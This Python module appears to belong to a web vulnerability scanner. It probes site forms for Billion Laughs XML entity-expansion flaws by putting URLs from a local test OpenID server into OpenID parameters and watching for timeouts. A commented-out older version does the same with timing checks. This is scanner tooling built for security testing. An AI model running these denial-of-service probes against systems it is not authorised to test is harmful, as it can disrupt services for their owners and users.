from ..utils import attack
from ..openID_test_server import OpenIDServer
import socket


def search(page):
    for form in page.get_forms():
        yield (form,)


@attack(search)
def billion_laughs(client, log, form):
    def attack(attack_url):
        parameters = dict(form.get_parameters())
        for key in parameters:
            if 'openid' in key:
                parameters[key] = attack_url

        try:
            result = form.send(client, parameters)
        except socket.timeout:
            return True
        return False

    with OpenIDServer.create_server() as openid_server:
        if attack(openid_server.benign_url):
            log('warn', openid_server.benign_url, "Billion Laughs",
                "Test did not work")
            return

        for evil_url in openid_server.evil_urls:
            if attack(evil_url):
                log('vuln', evil_url, "Billion Laughs")




# from ..utils import attack, modify_parameter
# import time
# import multiprocessing
# from ..openID_test import main


# def search(page):
#     for form in page.get_forms():
#         yield (form,)


# @attack(search)
# def billion_laughs(client, log, form):

#     port = 50162
#     openid_url = "http://localhost:%i" % port
#     openid_billion_laughs = "http://localhost:%i/db" % port
#     openid_quadratic_blowup = "http://localhost:%i/dq" % port

#     parameters = dict(form.get_parameters())
#     server = multiprocessing.Process(target=main, args=(port,))
#     server.start()
#     for parameter in parameters:
#         print(parameters)
#         print(parameter)
#         if parameter == '':
#             continue
#         if parameters[parameter] == 'abcdefgh':
#             xml_page = openid_billion_laughs
#         else:
#             xml_page = parameters[parameter]
#         attack_parameters = modify_parameter(parameters, parameter,
#                                              openid_url)
#         server.join(0.001)
#         startTime = time.time()
#         result = form.send(client, attack_parameters)
#         endTime = time.time()
#         elapsedTime = endTime - startTime
#         attack_parameters = modify_parameter(parameters, parameter,
#                                              xml_page)

#         p = multiprocessing.Process(
#             target=form.send, args=(client, attack_parameters))
#         p.start()

#         p.join(elapsedTime + 1)
#         if p.is_alive():
#             log('vuln', result.url, "Billion Laughs",
#                 "in URL parameter " + parameter)
#             p.terminate()
#             p.join()

#     server.terminate()
#     server.join()
